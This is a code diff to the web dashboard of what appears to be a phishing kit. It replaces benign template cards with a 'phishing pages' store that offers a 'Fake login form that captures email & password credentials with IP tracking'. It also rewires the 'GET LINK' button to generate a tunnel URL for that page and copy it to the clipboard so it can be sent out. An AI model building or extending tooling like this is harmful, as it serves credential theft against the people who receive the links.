@@ -1329,85 +1329,38 @@ if(saved && saved!=='dark') { document.documentElement.setAttribute('data-theme'
 </script>
 <script type="module">
   // ================== TEMPLATE STORE ==================
-
+// Available phishing pages from the 'sites/' folder
 const siteTemplates = [
   {
-    name: "Modern Dashboard",
-    desc: "Clean futuristic admin dashboard template with responsive layout.",
-    image: "https://images.unsplash.com/photo-1461749280684-dccba630e2f6?q=80&w=1200",
-    tags: ["dashboard","admin","ui"],
-    link: "#"
-  },
-
-  {
-    name: "Portfolio Landing",
-    desc: "Personal portfolio website template for developers and creators.",
-    image: "https://images.unsplash.com/photo-1498050108023-c5249f4df085?q=80&w=1200",
-    tags: ["portfolio","personal","modern"],
-    link: "#"
-  },
-
-  {
-    name: "Startup Website",
-    desc: "Modern startup homepage with pricing and features section.",
-    image: "https://images.unsplash.com/photo-1551434678-e076c223a692?q=80&w=1200",
-    tags: ["startup","landing","business"],
-    link: "#"
-  },
-
-  {
-    name: "Dark Login UI",
-    desc: "Stylish centered authentication interface with cyberpunk design.",
+    file: "login.html",
+    name: "Login Page",
+    desc: "Fake login form that captures email & password credentials with IP tracking.",
     image: "https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1200",
-    tags: ["login","dark","cyberpunk"],
-    link: "#"
+    tags: ["login","credential","capture"],
   }
 ];
 
 window.renderSites = () => {
-
   const grid = document.getElementById('sitesGrid');
-  const search =
-    document.getElementById('siteSearch').value.toLowerCase();
+  const search = document.getElementById('siteSearch').value.toLowerCase();
 
   const filtered = siteTemplates.filter(site =>
-    (
-      site.name +
-      site.desc +
-      site.tags.join(' ')
-    ).toLowerCase().includes(search)
+    (site.name + site.desc + site.tags.join(' ')).toLowerCase().includes(search)
   );
 
-  grid.innerHTML = filtered.map(site => `
+  grid.innerHTML = filtered.map((site, index) => `
     <div class="site-card">
-
       <img class="site-preview" src="${site.image}" />
-
       <div class="site-content">
-
-        <div class="site-title">
-          ${site.name}
-        </div>
-
-        <div class="site-desc">
-          ${site.desc}
-        </div>
-
+        <div class="site-title">${site.name}</div>
+        <div class="site-desc">${site.desc}</div>
         <div class="site-tags">
-          ${site.tags.map(t =>
-            `<div class="site-tag">${t}</div>`
-          ).join('')}
+          ${site.tags.map(t => `<div class="site-tag">${t}</div>`).join('')}
         </div>
-
-        <button
-          class="site-btn"
-          onclick="window.open('${site.link}','_blank')"
-        >
+        <button class="site-btn" onclick="generateTunnelForSite(${index})">
           GET LINK
         </button>
-
       </div>
-
     </div>
   `).join('');
 };
@@ -1556,8 +1509,22 @@ window.generateTunnelForSite = (siteIndex) => {
   
   tunnels.push(tunnel);
   
-  // Show tunnel info in a modal
+  // Show tunnel modal and auto-copy URL to clipboard
   showTunnelModal(tunnel);
+  
+  // Auto-copy URL to clipboard
+  navigator.clipboard.writeText(tunnel.url).then(() => {
+    toast('URL GENERATED & COPIED TO CLIPBOARD ✅');
+  }).catch(() => {
+    // Fallback for older browsers
+    const textarea = document.createElement('textarea');
+    textarea.value = tunnel.url;
+    document.body.appendChild(textarea);
+    textarea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textarea);
+    toast('URL GENERATED & COPIED TO CLIPBOARD ✅');
+  });
 };
 
 // Show tunnel modal
